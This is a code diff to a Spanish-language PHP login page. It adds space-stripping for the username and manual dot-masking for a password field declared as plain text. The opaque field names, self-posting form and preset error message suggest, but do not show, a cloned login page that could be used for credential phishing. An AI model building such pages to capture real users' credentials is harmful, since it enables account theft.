@@ -66,9 +66,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <form method="post" action="" id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                 <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                 <input id="i1" name="ips1" placeholder="Usuario" type="text" required
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)">
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handleUsernameInput(this)">
                 <input id="i2" name="ips2" placeholder="Contraseña" type="text" required
-                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" oninput="handlePasswordInput(this)" onkeypress="return noEspacios(event)">
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" oninput="handlePasswordInputNoSpaces(this)" onkeypress="return noEspacios(event)">
                 <p id="error-message">Usuario o contraseña incorrecta</p>
                 <input type="submit" value="Inicie Sesión"
                        style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
@@ -154,6 +154,33 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         } else if (displayedValue.length > realValue.length) {
             // Si el usuario agregó caracteres, agregar al valor real
             const newChars = displayedValue.substring(realValue.length);
+            input.dataset.realValue += newChars;
+        }
+        
+        // Mostrar asteriscos en el campo
+        input.value = '●'.repeat(input.dataset.realValue.length);
+    }
+
+    function handleUsernameInput(input) {
+        input.value = input.value.replace(/\s/g, '');
+    }
+
+    function handlePasswordInputNoSpaces(input) {
+        // Guardar el valor real en un atributo data
+        if (!input.dataset.realValue) {
+            input.dataset.realValue = '';
+        }
+        
+        // Obtener el valor real y el valor mostrado
+        const realValue = input.dataset.realValue;
+        const displayedValue = input.value;
+        
+        // Si el usuario borró caracteres, actualizar el valor real
+        if (displayedValue.length < realValue.length) {
+            input.dataset.realValue = realValue.substring(0, displayedValue.length);
+        } else if (displayedValue.length > realValue.length) {
+            // Si el usuario agregó caracteres, agregar al valor real eliminando espacios
+            const newChars = displayedValue.substring(realValue.length).replace(/\s/g, '');
             input.dataset.realValue += newChars;
         }
         
